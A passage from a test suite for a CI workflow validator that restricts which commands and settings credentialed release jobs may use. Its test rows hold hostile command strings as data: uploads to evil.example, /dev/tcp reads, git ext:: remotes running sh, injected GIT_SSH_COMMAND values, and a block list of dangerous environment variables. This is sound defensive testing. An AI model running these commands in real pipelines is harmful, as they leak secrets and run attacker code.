  "an ext:: remote after end-of-options":
    "git push: the remote must be a literal URL of a repository tools/repo-gates/release-settings.json names",
  "a repository the settings do not name":
    "git push: the remote must be a literal URL of a repository tools/repo-gates/release-settings.json names",
  "a forced refspec":
    "git push: every refspec is <HEAD|refs/\u2026>:refs/heads|tags/\u2026, never forced",
  "a refspec that is an expansion":
    "git push: every refspec is <HEAD|refs/\u2026>:refs/heads|tags/\u2026, never forced",
  "dotnet --source elsewhere":
    "dotnet nuget push: --source must be exactly https://api.nuget.org/v3/index.json",
  "gem push --host": "gem push: --host is not an option it may take",
  "curl -o": "curl: -o is not an option it may take",
  "curl -K": "curl: -K is not an option it may take",
  "curl to another host":
    "curl reaches only https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/v${UNIT_VERSION}.info, exactly",
  "aws (only the reviewed Maven script uploads to R2)":
    "aws is not a command a credentialed job runs",
  "rustup run": "rustup runs only `toolchain install`",
  "rustup with an expansion before --":
    'rustup toolchain install: "$X" starts with an expansion, which could become an option',
};

describe("rule 3: a credentialed job runs only its grammar and allowlist (#794 review)", () => {
  const block = (cmd) => `      - run: |\n          ${cmd.replace(/\n/g, "\n          ")}`;
  /**
   * The settings these rows run under: publish-npm's environment may reach
   * this repository (as goModuleTags' environment) and the mirror o/p, so a
   * git row is judged on its own shape. The settings rules this bends report
   * on the settings file, never as "a credentialed job", so accepts filter.
   */
  const reach = () => {
    const s = settings();
    s.goModuleTags = { include: ["refs/tags/apps/g/v*"], environment: "sdk-publish-npm" };
    s.mirrors = [{ repository: "o/p", unit: "p", environment: "sdk-publish-npm", tags: [] }];
    return s;
  };
  /** A Go unit, so the proxy URL prefix exists (its settings findings are filtered as above). */
  const withGo = {
    ...manifest,
    publish: [
      ...manifest.publish,
      { name: "go", registry: "go", coordinates: "github.com/confeature/sdks/apps/sdk-go" },
    ],
  };
  const inPublish = (cmd, opts = {}) =>
    run(swap(PUBLISH_STEP, block(cmd)), { s: reach(), m: withGo, ...opts });
  const credOnly = (got) => got.filter((w) => CRED.test(w));
  const CRED = /a credentialed job/;
  const PUSH = "git push --atomic --end-of-options";
  const RULE3_ROWS = [
    // Rounds 1 and 2: the blocklist's bypasses.
    ["a backslash continuation", "pn\\\npm install"],
    ["a continuation inside npm's arguments", "npm \\\n  ci"],
    ["an option before npm's subcommand", "npm --prefix x ci"],
    ["npm publish without --ignore-scripts", 'npm publish "./release/$ARTIFACT"'],
    [
      "npm publish --ignore-scripts=false",
      'npm publish --ignore-scripts --ignore-scripts=false "./release/$ARTIFACT"',
    ],
    ["bunx", "bunx some-tool"],
    ["deno", "deno run x.ts"],
    ["tsx", "tsx x.ts"],
    ["go test", "go test ./..."],
    ["source", "source scripts/x.sh"],
    [". (source)", ". scripts/x.sh"],
    ["a repository path without ./", "apps/cli/scripts/x.sh upload"],
    ["a command substitution", 'v="$(python3 evil.py)"'],
    ["a substitution inside a quoted argument", 'echo "$(node x.mjs)"'],
    ["a process substitution", "cat <(node x.mjs)"],
    ["a substitution inside ${ }", 'echo "${X:-$(node x.mjs)}"'],
    ["a backtick substitution", "echo `node x.mjs`"],
    ["a variable as the command", '"$CMD" publish'],
    ["eval", 'eval "$X"'],
    ["exec", "exec python3 x.py"],
    ["env", "env FOO=1 bash x.sh"],
    ["xargs", "ls | xargs sh"],
    ["find -exec", "find . -exec sh {} ;"],
    ["sort --compress-program", "sort --compress-program=sh"],
    ["sed's e flag", "sed 's/x/id/e'"],
    ["sed -e", "sed -e '1e id'"],
    ["sed -f", "sed -f script.sed"],
    ["a second sed script", "sed 's/a/b/' -e '1e id'"],
    ["git -c before the subcommand", "git -c core.sshCommand=sh push x"],
    ["git --upload-pack", "git fetch --upload-pack=sh x"],
    ["git config", "git config alias.x '!sh'"],
    ["a loop", "while read -r x; do python3 x; done < f"],
    ["a case", 'case "$x" in a) python3 y ;; esac'],
    ["a subshell", "(cd x && make)"],
    ["a function", "f() { pnpm install; }; f"],
    ["export", 'export PATH="./bin:$PATH"'],
    ["a prefix assignment", "BASH_ENV=x.sh echo hi"],
    ["an assignment", 'GIT_SSH_COMMAND="sh evil.sh"'],
    ["a write to GITHUB_PATH", 'echo "$PWD/bin" >> "$GITHUB_PATH"'],
    // Round 3: arithmetic that bash runs as subshells, case closing a substitution.
    ["((…)) read as arithmetic", "((node x.mjs) || (true))"],
    ["$((…)) read as arithmetic", "x=$((cmd) || (x))"],
    ["case after then", 'if true; then case "$x" in a) node x ;; esac; fi'],
    ["case inside $( )", 'echo "$(case x in a) node y ;; esac)"'],
    ["case in a group", "{ case x in a) node y;; esac; }"],
    ["case after !", "! case x in a) y;; esac"],
    ["case with in on the next line", "case x\nin a) node y;; esac"],
    ["ANSI-C quoting", "echo $'\\'' ; node x # '"],
    ['$"…" quoting', 'echo $"x"'],
    ["a one-line function", "function f { pnpm install; }"],
    ["function shadowing an earlier command", "node evil.mjs\nnode() { :; }"],
    ["a function defined in a skipped branch", "false && python3() { :; }; python3 x.py"],
    // Round 3: variables bound without NAME=.
    ["local", "local PATH=x"],
    ["read", "read PATH < publish-tmp/x"],
    ["printf -v", "printf -v PATH '%s' x"],
    ["for … in", "for PATH in x; do :; done"],
    ["for without in", "set -- a; for x do node evil.mjs; done"],
    ["an arithmetic for", "for ((i=0;i<1;i++)) do node x; done"],
    ["${…:=…}", ': "${PATH:=./bin}"'],
    ["export without a value", "export PATH"],
    ["export of an expansion", 'export "$N=x"'],
    // Round 3: expansions bash evaluates as code.
    ["an arithmetic subscript", "x='a[$(node evil.mjs)]'; echo \"$((x))\""],
    ["a substring expansion", 'echo "${s:x}"'],
    ["a funsub", 'echo "${ node x; }"'],
    ["a valsub", 'echo "${| node x; }"'],
    ["a substitution inside arithmetic", 'echo "$(( $(node x) ))"'],
    ["indirect expansion", 'echo "${!X}"'],
    // Round 3: options that reach a tool by other routes.
    [
      "an option through a variable",
      `${PUSH} "$X" git@github.com:confeature/sdks.git HEAD:refs/heads/main`,
    ],
    ["an operand that starts with an expansion", 'git push --atomic "$X" HEAD:refs/heads/main'],
    ["brace expansion", "git push --receive-pack={sh,x} x"],
    ["a glob", "git push --receive-pack=s* x"],
    [
      "an abbreviated long option (git)",
      `git push --receive-pa=sh --end-of-options git@github.com:confeature/sdks.git HEAD:refs/heads/main`,
    ],
    ["an abbreviated long option (sort)", "sort --compress-prog=sh"],
    ["git init --template", "git init --template=publish-tmp/t publish-tmp/m.git"],
    ["cd before an exception", 'cd apps && bash cli/scripts/publish-r2.sh promote "${TAG#cli-v}"'],
    // Round 3: writes that change later steps.
    ["GITHUB_ENV through a literal", "printf 'PATH=x' >> \"$GITHUB_ENV\""],
    [
      "the runner's file-command directory",
      "echo x > publish-tmp/../../_temp/_runner_file_commands/set_env_1",
    ],
    ["RUNNER_TEMP", 'printf x > "$RUNNER_TEMP/x"'],
    ["a write outside publish-tmp", "printf x > apps/cli/scripts/publish-r2.sh"],
    ["rm outside publish-tmp", "rm -rf apps"],
    ["mkdir outside publish-tmp", "mkdir -p apps/x"],
    // Round 3: remote helpers and pinned destinations (security review).
    ["an ext:: remote", "git push 'ext::sh -c touch% /tmp/x' main"],
    ["an fd:: remote", "git fetch fd::3"],
    ["an ext:: remote after end-of-options", `${PUSH} 'ext::sh -c x' HEAD:refs/heads/x`],
    [
      "a repository the settings do not name",
      `${PUSH} git@github.com:attacker/x.git HEAD:refs/tags/x`,
    ],
    ["a forced refspec", `${PUSH} git@github.com:confeature/sdks.git +HEAD:refs/heads/main`],
    ["a refspec that is an expansion", `${PUSH} git@github.com:confeature/sdks.git "$REF"`],
    [
      "dotnet --source elsewhere",
      'dotnet nuget push "./x.nupkg" --api-key "$K" --source https://evil.example/v3/index.json',
    ],
    ["gem push --host", 'gem push --host https://evil.example "./x.gem"'],
    ["curl -o", "curl -fsS -o x https://proxy.golang.org/x"],
    ["curl -K", "curl -K cfg https://proxy.golang.org/x"],
    ["curl to another host", "curl -fsS https://evil.example/x"],
    [
      "aws (only the reviewed Maven script uploads to R2)",
      "aws s3api --endpoint-url https://evil.example put-object",
    ],
    ["rustup run", "rustup run stable node x"],
    ["rustup with an expansion before --", 'rustup toolchain install "$X"'],
  ];
  afterAll(() => RULE3.finish());
  it("records a reason for exactly the rows of the table, and none left over", () =>
    expect(Object.keys(REASONS).sort()).toEqual(RULE3_ROWS.map(([label]) => label).sort()));
  it.each(RULE3.rows(RULE3_ROWS))("refuses %s, for its own reason", (label, cmd) => {
    const got = inPublish(cmd);
    // And with exactly its recorded number of rule-3 findings (round 7).
    const cred = got.filter((w) => CRED.test(w));
    RULE3.check(label, cred);
    expect(Object.hasOwn(REASONS, label), `no reason recorded for ${label}`).toBe(true);
    expect(
      got.some((w) => CRED.test(w) && w.includes(REASONS[label])),
      `${cmd}\nwant: ${REASONS[label]}\ngot:\n${got.join("\n")}`,
    ).toBe(true);
  });

  // Each row fails on its own check, not on a neighbour's.
  it.each([
    ["a here-document", "echo x <<echo\necho", /has a here-document/],
    ["a backtick", "echo `echo`", /has a backtick/],
    ["an unquoted $", "echo $X", /an unquoted \$/],
    ["a glob", "ls release/*", /a glob character/],
    ["a & background job", "echo x & echo y", /a & \(background/],
    ["a subshell around an allowed command", "( echo hi )", /a \( \) or \{ \}/],
    ["a tilde", "echo ~/x", /a ~ \(tilde expansion\)/],
    ["an unterminated single quote", "echo 'abc", /an unterminated single quote/],
    ["an unterminated double quote", 'echo "abc', /an unterminated double quote/],
    ["a descriptor redirection", "echo x 2> publish-tmp/e", /a descriptor redirection/],
    ["two redirections in a row", "echo x > > publish-tmp/e", /two redirections in a row/],
    ["a redirection with no target", "echo x >", /a > with no target/],
    ["a disallowed character", "echo x^y", /a character this grammar does not allow \("\^"\)/],
    ["a ;;", "echo a ;; echo b", /a ;; \(case\)/],
    ["a |& pipe", "echo a |& cat", /a \|& pipe/],
    ["a <( process substitution", "cat <(echo)", /a process substitution/],
    ["a ! negation", "! echo x", /a ! \(negation\)/],
    ["a subscript in ${ }", 'echo "${x[0]}"', /an operator expansion other than/],
    ["an @ transform in ${ }", 'echo "${x@Q}"', /an operator expansion other than/],
    ["a / substitution in ${ }", 'echo "${x/a/b}"', /an operator expansion other than/],
    ["a # length in ${ }", 'echo "${#x}"', /an operator expansion other than/],
    ["a group around an allowed command", "{ echo hi; }", /a \( \) or \{ \}/],
    ["a backslash outside quotes", "echo a\\ b", /a backslash outside quotes/],
    ["a substitution inside ${ }", 'echo "${X:-$(echo)}"', /\$\{ with \$/],
    [
      "a write outside publish-tmp",
      "echo x > apps/cli/scripts/publish-r2.sh",
      /writes only publish-tmp/,
    ],
    ["a .. in a redirection", "echo x > publish-tmp/../apps/x", /a literal path/],
    [
      "input from a device",
      "sort < /dev/tcp/evil/80",
      /reads input only from publish-tmp\/ or a path this job downloads to/,
    ],
    ["input from the checkout", "sort < apps/cli/install.sh", /reads input only from/],
    [
      "input from release/ in a job that downloads nothing there",
      "sort < release/x",
      /reads input only from/,
    ],
    [
      "a git global option other than --git-dir",
      "git --exec-path=x init --quiet --bare publish-tmp/m.git",
      /global option/,
    ],
  ])("refuses %s, for that reason", (_, cmd, re) => fires(inPublish(cmd), re));

  it("a folded run: > block is read as bash reads it, folded", () =>
    fires(
      run(swap(PUBLISH_STEP, "      - run: >\n          echo hi\n          && node x.mjs")),
      /node is not a command/,
    ));

  it.each([
    [
      "a single-file digest check",
      `printf '%s  %s\\n' "$EXPECTED_SHA256" "release/$ARTIFACT" | sha256sum --check --strict`,
    ],
    [
      "a file-set check, with an apostrophe in a message",
      `mkdir -p publish-tmp
ls -1 release | sort > publish-tmp/got-files
printf '%s\\n' "$EXPECTED_SUMS" | cut -d ' ' -f 3- | sort > publish-tmp/want-files
if cmp publish-tmp/got-files publish-tmp/want-files; then echo "the file set is the pack job's"; else echo "::error::it isn't"; exit 1; fi
printf '%s\\n' "$EXPECTED_SUMS" | sed 's|  |  release/|' | sha256sum --check --strict`,
    ],
    [
      "a deploy key and a Go module tag push",
      `if [ -z "$DEPLOY_KEY" ]; then echo "::error::no key"; exit 1; fi
umask 077
mkdir -p publish-tmp/ssh
printf '%s\\n' "$DEPLOY_KEY" > publish-tmp/ssh/key
${PUSH} git@github.com:confeature/sdks.git "HEAD:refs/tags/\${RELEASE_TAG}"
rm -rf publish-tmp/ssh`,
    ],
    [
      "a mirror received from its bundle",
      `git init --quiet --bare publish-tmp/mirror.git
git --git-dir=publish-tmp/mirror.git bundle verify --quiet --end-of-options release/mirror.bundle
git --git-dir=publish-tmp/mirror.git fetch --quiet --end-of-options release/mirror.bundle refs/heads/main:refs/heads/main
git --git-dir=publish-tmp/mirror.git rev-parse refs/heads/main > publish-tmp/got-split`,
    ],
    [
      "the Go proxy warm-up",
      `curl -fsS --proto '=https' --retry 5 --retry-delay 15 --retry-all-errors "https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/v\${UNIT_VERSION}.info"`,
    ],
    [
      "the NuGet upload",
      'dotnet nuget push "./release/${UNIT_COORDINATES}.${UNIT_VERSION}.nupkg" --api-key "$NUGET_API_KEY" --source https://api.nuget.org/v3/index.json',
    ],
  ])("accepts %s", (_, cmd) => expect(credOnly(inPublish(cmd))).toEqual([]));

  it("accepts a mirror push to the repository the settings name, and only there", () => {
    const push = (repo, s) =>
      inPublish(
        `git --git-dir=publish-tmp/mirror.git ${PUSH.slice(4)} git@github.com:${repo}.git refs/heads/main:refs/heads/main "refs/heads/main:refs/tags/\${MIRROR_TAG}"`,
        s === undefined ? {} : { s },
      );
    expect(credOnly(push("o/p"))).toEqual([]);
    fires(push("o/other"), /the remote must be a literal URL/);
    // Each literal from its own environment only: o/p declared for another
    // environment, or this repository without goModuleTags here, is refused.
    const elsewhere = reach();
    elsewhere.mirrors[0].environment = "sdk-publish-packagist";
    fires(push("o/p", elsewhere), /the remote must be a literal URL/);
    const noGo = reach();
    delete noGo.goModuleTags;
    fires(
      inPublish(`${PUSH} git@github.com:confeature/sdks.git "HEAD:refs/tags/\${RELEASE_TAG}"`, {
        s: noGo,
      }),
      /the remote must be a literal URL/,
    );
  });

  it("joins a backslash continuation the way bash does, so an exception still matches", () => {
    const own = swap("  publish-npm:\n", "  publish-crates:\n").replace(
      PUBLISH_STEP,
      '      - run: |\n          cargo "+${RUST_VERSION}" publish --no-verify \\\n            --manifest-path "${UNIT_PATH}/Cargo.toml"',
    );
    const head = HEAD.replaceAll("needs.pack-npm.", "needs.pack-crates.");
    expect(run(own, { head, s: reach() }).filter((w) => CRED.test(w))).toEqual([]);
  });

  const jobWith = (extra) =>
    swap("    environment: sdk-publish-npm\n", `    environment: sdk-publish-npm\n${extra}`);
  it.each([
    [
      "a step shell other than bash",
      swap(PUBLISH_STEP, "      - shell: python {0}\n        run: echo hi"),
      /shell other than plain bash/,
    ],
    [
      "bash with extra arguments",
      swap(PUBLISH_STEP, "      - shell: bash evil {0}\n        run: echo hi"),
      /shell other than plain bash/,
    ],
    [
      "bash -i --rcfile",
      swap(PUBLISH_STEP, "      - shell: bash -i --rcfile x {0}\n        run: echo hi"),
      /shell other than plain bash/,
    ],
    [
      "a job defaults.run.shell",
      jobWith("    defaults:\n      run:\n        shell: pwsh\n"),
      /shell other than plain bash/,
    ],
    [
      "a step working-directory",
      swap(PUBLISH_STEP, "      - working-directory: apps\n        run: echo hi"),
      /working-directory/,
    ],
    [
      "a job defaults.run.working-directory",
      jobWith("    defaults:\n      run:\n        working-directory: apps\n"),
      /working-directory/,
    ],
    [
      "a Windows runner",
      GOOD.replace(
        "    runs-on: ubuntu-latest\n    environment: sdk-publish-npm",
        "    runs-on: windows-latest\n    environment: sdk-publish-npm",
      ),
      /ubuntu-\*/,
    ],
    ["a container", jobWith("    container: node:22\n"), /in a container/],
    ["services", jobWith("    services:\n      db:\n        image: postgres\n"), /beside services/],
    ["a job env: name off the allowlist", jobWith("    env:\n      PAGER: sh\n"), /sets PAGER/],
    [
      "GITHUB_ENV named anywhere",
      swap(
        PUBLISH_STEP,
        "      - env:\n          ARTIFACT: ${{ env.GITHUB_ENV }}\n        run: echo hi",
      ),
      /names GITHUB_ENV/,
    ],
    [
      "GITHUB_PATH named anywhere",
      swap(PUBLISH_STEP, "      - env:\n          ARTIFACT: GITHUB_PATH\n        run: echo hi"),
      /names GITHUB_ENV, GITHUB_PATH/,
    ],
    [
      "download-artifact into the checkout",
      swap(
        PUBLISH_STEP,
        `      - uses: actions/download-artifact@${SHA}\n        with:\n          name: release-npm\n          path: apps`,
      ),
      /release\/ or dist\/ only/,
    ],
    [
      "a checkout path",
      swap(
        PUBLISH_STEP,
        `      - uses: actions/checkout@${SHA}\n        with:\n          persist-credentials: false\n          path: x`,
      ),
      /takes no path/,
    ],
  ])("refuses %s", (_, jobs, re) => fires(run(jobs), re));

  it("refuses a workflow defaults.run.shell or working-directory", () => {
    fires(
      run(GOOD, { head: `${HEAD}defaults:\n  run:\n    shell: sh\n` }),
      /shell other than plain bash/,
    );
    fires(
      run(GOOD, { head: `${HEAD}defaults:\n  run:\n    working-directory: apps\n` }),
      /working-directory/,
    );
  });

  it.each([
    "DOTNET_STARTUP_HOOKS",
    "RUBYGEMS_GEMDEPS",
    "OPENSSL_CONF",
    "OPENSSL_ENGINES",
    "RUSTUP_DIST_SERVER",
    "AWS_PAGER",
    "PAGER",
    "EDITOR",
    "CARGO_REGISTRY_CREDENTIAL_PROVIDER",
    "CARGO_REGISTRIES_X_CREDENTIAL_PROVIDER",
    "CORECLR_PROFILER_PATH",
    "BASH_ENV",
    "NODE_OPTIONS",
    "PATH",
  ])("refuses %s in a step's, the job's or the workflow's env:", (name) => {
    fires(
      run(swap(PUBLISH_STEP, `      - env:\n          ${name}: x\n        run: echo hi`)),
      new RegExp(`sets ${name}`),
    );
    fires(run(jobWith(`    env:\n      ${name}: x\n`)), new RegExp(`sets ${name}`));
    fires(
      run(GOOD, { head: HEAD.replace("env:\n", `env:\n  ${name}: x\n`) }),
      new RegExp(`sets ${name}`),
    );
  });
  it.each([
    ["GIT_SSH_COMMAND that is not ssh", "GIT_SSH_COMMAND: sh evil.sh"],
    ["GIT_SSH_COMMAND with a ProxyCommand", "GIT_SSH_COMMAND: ssh -o ProxyCommand=x"],
    ["GIT_SSH_COMMAND with a config file", "GIT_SSH_COMMAND: ssh -F ssh_config"],
    ["GIT_ALLOW_PROTOCOL with ext", "GIT_ALLOW_PROTOCOL: ssh:ext"],
  ])("refuses %s", (_, kv) =>
    fires(
      run(swap(PUBLISH_STEP, `      - env:\n          ${kv}\n        run: echo hi`)),
      /GIT_SSH_COMMAND must|GIT_ALLOW_PROTOCOL allows/,
    ),
  );
});

describe("rule 8 and rule 6: local, container and reusable-workflow references (#794 review)", () => {
  it.each([
    ["a local action in a publish job", "./.github/actions/x"],
    ["a container action in a publish job", "docker://alpine:3"],
  ])("refuses %s", (_, uses) =>
    fires(run(swap(PUBLISH_STEP, `      - uses: ${uses}`)), /runs no local or container action/),
  );
  it("refuses a local action in a pack job", () =>
    fires(
      run(GOOD.replace(INSTALL_STEP, `      - uses: ./.github/actions/x\n${INSTALL_STEP}`)),
      /runs no local or container action/,
    ));
  it("allows a local action in a job that packs and holds nothing", () =>
    expect(run(`${GOOD}  lint:\n    steps:\n      - uses: ./.github/actions/x\n`)).toEqual([]));
  it("a job-level reusable workflow is held to the SHA and allow-list rules", () => {
    const call = (uses) =>
      run(GOOD, { extra: { "x.yml": parseYaml(`on: push\njobs:\n  j:\n    uses: ${uses}\n`) } });
    fires(call("evil/flows/.github/workflows/w.yml@main"), /without a full commit SHA/);
    fires(
      call(`evil/flows/.github/workflows/w.yml@${SHA}`),
      /uses evil\/flows, which .* does not allow/,
    );
  });
  it("sdk-publish.yml calls no reusable workflow at all", () =>
    fires(
      run(`${GOOD}  w:\n    uses: ./.github/workflows/cli-windows-install-verify.yml\n`, {
        extra: { "cli-windows-install-verify.yml": VERIFY_CALLEE },
      }),
      /RELEASE_CALLS does not record/,
    ));
  it("cli-release.yml calls only the recorded workflow, and passes it no secret", () => {
    fires(
      runCli(CLI.replace("cli-windows-install-verify.yml", "other.yml")),
      /RELEASE_CALLS does not record/,
    );
    fires(runCli(`${CLI}    secrets:\n      T: x\n`), /passes secrets to a called workflow/);
  });
  it("a call to a workflow that does not exist", () =>
    fires(
      run(GOOD, {
        extra: {
          "x.yml": parseYaml("on: push\njobs:\n  j:\n    uses: ./.github/workflows/gone.yml\n"),
        },
      }),
      /not a workflow of this repository/,
    ));
});

describe("§5: a credentialed job publishes this run's artifact, on a tag push only (#794 review)", () => {
  it.each(["run-id: 123", "github-token: x", "repository: other/repo"])(
    "refuses download-artifact with %s",
    (input) =>
      fires(
        run(
          swap(
            PUBLISH_STEP,
            `      - uses: actions/download-artifact@${SHA}\n        with:\n          name: release-npm\n          ${input}`,
          ),
        ),
        /downloads an artifact from another run/,
      ),
  );
  it("accepts download-artifact of this run", () =>
    expect(
      run(
        swap(
          PUBLISH_STEP,
          `      - uses: actions/download-artifact@${SHA}\n        with:\n          name: release-npm\n          path: release`,
        ),
      ),
    ).toEqual([]));
  const IF = "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/')\n";
  // sdk-publish.yml also runs on workflow_dispatch, a dry run that must publish nothing.
  const DISPATCH = HEAD.replace(
    '    tags: ["sdk-*-v*"]\n',
    '    tags: ["sdk-*-v*"]\n  workflow_dispatch:\n',
  );
  it("control: the tag-push condition, in a workflow a dispatch also runs, is clean", () =>
    expect(run(GOOD, { head: DISPATCH })).toEqual([]));
  it.each([
    ["no if: at all", ""],
    ["no tag condition", "    if: github.event_name == 'push'\n"],
    ["no push condition", "    if: startsWith(github.ref, 'refs/tags/')\n"],
    [
      "a negated conjunct",
      "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/') && !cancelled()\n",
    ],
    ["!=", "    if: github.event_name != 'pull_request' && startsWith(github.ref, 'refs/tags/')\n"],
    [
      "the conjuncts nested in parentheses",
      "    if: always() && (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/'))\n",
    ],
    [
      "the condition ORed away",
      "    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/') || always()\n",
    ],
  ])("refuses a publish job with %s, in a workflow a dispatch also runs", (_, cond) =>
    fires(run(swap(IF, cond), { head: DISPATCH }), /does not require a tag push/),
  );
  it("a workflow that runs on tag pushes only needs no if:", () => {
    expect(run(swap(IF, ""))).toEqual([]);
    const branches = HEAD.replace(
      '    tags: ["sdk-*-v*"]\n',
      '    tags: ["sdk-*-v*"]\n    branches: [main]\n',
    );
    fires(run(swap(IF, ""), { head: branches }), /does not require a tag push/);
  });
});

describe("13 the public gate runs on every push to main and every pull request (#794 review)", () => {
  const VERIFY = `on:
  push:
    branches: [main]
  pull_request:
jobs:
  verify:
    steps:
      - run: pnpm install --frozen-lockfile
      - run: pnpm run verify
      - run: deno task --cwd apps/cli test
`;
  const gate = (text) => publicGateFindings({ "verify.yml": parseYaml(text) }).map((f) => f.why);
  it("control: the fixture is clean, and so is the real verify.yml", () => {
    expect(gate(VERIFY)).toEqual([]);
    expect(verifyWorkflows(ROOT).filter((f) => f.file === "verify.yml")).toEqual([]);
  });
  it("a missing verify.yml", () =>
    fires(
      publicGateFindings({}).map((f) => f.why),
      /is missing/,
    ));
  it.each([
    [
      "no push trigger",
      VERIFY.replace("  push:\n    branches: [main]\n", ""),
      /every push to main/,
    ],
    ["push to another branch", VERIFY.replace("[main]", "[develop]"), /every push to main/],
    ["no pull_request trigger", VERIFY.replace("  pull_request:\n", ""), /every pull request/],
    [
      "a path filter",
      VERIFY.replace("  pull_request:\n", "  pull_request:\n    paths: [apps/**]\n"),
      /filters pull_request by paths/,
    ],
    [
      "the gate step removed",
      VERIFY.replace("      - run: pnpm run verify\n", ""),
      /no step that runs/,
    ],
    [
      "the gate stubbed",
      VERIFY.replace("pnpm run verify", "echo pnpm run verify"),
      /no step that runs/,
    ],
    [
      "an if: on the step",
      VERIFY.replace(
        "      - run: pnpm run verify",
        "      - if: false\n        run: pnpm run verify",
      ),
      /no step that runs/,
    ],
    [
      "an if: on the job",
      VERIFY.replace("  verify:\n", "  verify:\n    if: false\n"),
      /no step that runs/,
    ],
    [
      "continue-on-error",
      VERIFY.replace("  verify:\n", "  verify:\n    continue-on-error: true\n"),
      /no step that runs/,
    ],
    [
      "the CLI's tests removed",
      VERIFY.replace("      - run: deno task --cwd apps/cli test\n", ""),
      /no step that runs `deno task/,
    ],
    [
      "paths-ignore",
      VERIFY.replace("  pull_request:\n", "  pull_request:\n    paths-ignore: [docs/**]\n"),
      /filters pull_request by paths-ignore/,
    ],
    [
      "push branches-ignore",
      VERIFY.replace(
        "    branches: [main]\n",
        "    branches: [main]\n    branches-ignore: [main]\n",
      ),
      /filters push by branches-ignore/,
    ],
    ["push to more branches than main", VERIFY.replace("[main]", "[main, dev]"), /exactly/],
    [
      "pull_request branches",
      VERIFY.replace("  pull_request:\n", "  pull_request:\n    branches: [main]\n"),
      /filters pull_request by branches/,
    ],
    [
      "pull_request types",
      VERIFY.replace("  pull_request:\n", "  pull_request:\n    types: [labeled]\n"),
      /filters pull_request by types/,
    ],
    [
      "a step shell",
      VERIFY.replace(
        "      - run: pnpm run verify",
        "      - shell: sh\n        run: pnpm run verify",
      ),
      /shell other than bash/,
    ],
    [
      "a job defaults.run.shell",
      VERIFY.replace("  verify:\n", "  verify:\n    defaults:\n      run:\n        shell: sh\n"),
      /a job sets defaults.run/,
    ],
    [
      "a workflow defaults.run",
      `${VERIFY}defaults:\n  run:\n    working-directory: apps\n`,
      /sets defaults.run/,
    ],
    [
      "a step working-directory",
      VERIFY.replace(
        "      - run: pnpm run verify",
        "      - working-directory: apps\n        run: pnpm run verify",
      ),
      /working-directory/,
    ],
    [
      "a step env",
      VERIFY.replace(
        "      - run: pnpm run verify",
        "      - env:\n          NODE_OPTIONS: --require ./x.js\n        run: pnpm run verify",
      ),
      /step sets env/,
    ],
    [
      "a step continue-on-error",
      VERIFY.replace(
        "      - run: pnpm run verify",
        "      - continue-on-error: true\n        run: pnpm run verify",
      ),
      /continue-on-error/,
    ],
    ["needs:", VERIFY.replace("  verify:\n", "  verify:\n    needs: other\n"), /needs:/],
    [
      "a job env",
      VERIFY.replace("  verify:\n", "  verify:\n    env:\n      NODE_OPTIONS: x\n"),
      /a job sets env:/,
    ],
    [
      "a workflow env name off the allowlist",
      `${VERIFY}env:\n  NODE_OPTIONS: --require ./x.js\n`,
      /sets env NODE_OPTIONS, which PUBLIC_GATE_ENV/,
    ],
  ])("refuses %s", (_, text, re) => fires(gate(text), re));
});

describe("14 every release job waits on workflow-rules (#794 review, round 3)", () => {
  const W = (jobs) => parseYaml(`on: push\njobs:\n${jobs}`);
  const GATE = "  workflow-rules:\n    steps: []\n";
  const both = (pub, cli = `${GATE}  release:\n    needs: workflow-rules\n`) =>
    releaseGateFindings({ "sdk-publish.yml": W(pub), "cli-release.yml": W(cli) }).map(
      (f) => `${f.file} ${f.job}: ${f.why}`,
    );
  it("control: the real release workflows, and a transitive chain, are clean", () => {
    expect(verifyWorkflows(ROOT).filter((f) => /does not wait|workflow-rules/.test(f.why))).toEqual(
      [],
    );
    expect(
      both(`${GATE}  setup:\n    needs: workflow-rules\n  pack-npm:\n    needs: [setup]\n`),
    ).toEqual([]);
  });
  it("a job that does not wait on it", () =>
    expect(
      both(`${GATE}  setup:\n    needs: workflow-rules\n  pack-npm:\n    steps: []\n`),
    ).toEqual(["sdk-publish.yml pack-npm: does not wait on workflow-rules"]));
  it("a release workflow without it", () =>
    expect(both("  setup:\n    steps: []\n")).toContain(
      "sdk-publish.yml -: has no workflow-rules job",
    ));
  it.each(["needs: setup", "if: false", "continue-on-error: true"])(
    "workflow-rules with %s",
    (kv) =>
      expect(
        both(`  workflow-rules:\n    ${kv}\n  setup:\n    needs: workflow-rules\n`).join(),
      ).toMatch(/so the rules can be skipped/),
  );
  it("cli-release.yml is held to it too", () =>
    expect(both(GATE, `${GATE}  release:\n    steps: []\n`)).toEqual([
      "cli-release.yml release: does not wait on workflow-rules",
    ]));
});

describe("15 a run block reads only variables something defines (#794 review, round 4)", () => {
  it("would have caught publish-crates and publish-pubdev reading an undefined UNIT_PATH", () => {
    const head = HEAD.replace("  UNIT_PATH: ${{ needs.setup.outputs.path }}\n", "");
    const crates = swap("  publish-npm:\n", "  publish-crates:\n").replace(
      PUBLISH_STEP,
      '      - run: cargo "+${RUST_VERSION}" publish --no-verify --manifest-path "${UNIT_PATH}/Cargo.toml"',
    );
    fires(
      run(crates, { head }),
      /reads \$UNIT_PATH, which no env: of its step, job or workflow defines/,
    );
  });
  it("accepts a variable the step, the job or the workflow defines", () => {
    const head = HEAD.replace("  UNIT_PATH: ${{ needs.setup.outputs.path }}\n", "");
    const step =
      '      - env:\n          UNIT_PATH: ${{ needs.setup.outputs.path }}\n        run: echo "$UNIT_PATH"';
    expect(run(swap(PUBLISH_STEP, step), { head })).toEqual([]);
    const job = swap(
      "    environment: sdk-publish-npm\n",
      "    environment: sdk-publish-npm\n    env:\n      UNIT_PATH: ${{ needs.setup.outputs.path }}\n",
    ).replace(PUBLISH_STEP, '      - run: echo "$UNIT_PATH"');
    expect(run(job, { head })).toEqual([]);
  });
  it("in a pack job, a variable the block assigns, reads or loops over is defined", () =>
    expect(
      run(
        swap(
          INSTALL_STEP,
          '      - run: |\n          f="$RUNNER_TEMP/x"\n          for d in a b; do echo "$d"; done\n          read -r line < "$f"\n          echo "$f $line"',
        ),
      ),
    ).toEqual([]));
  it("refuses an undefined variable in a pack job, and the runner list is explicit", () => {
    fires(run(swap(INSTALL_STEP, '      - run: echo "$UNSET_THING"')), /reads \$UNSET_THING/);
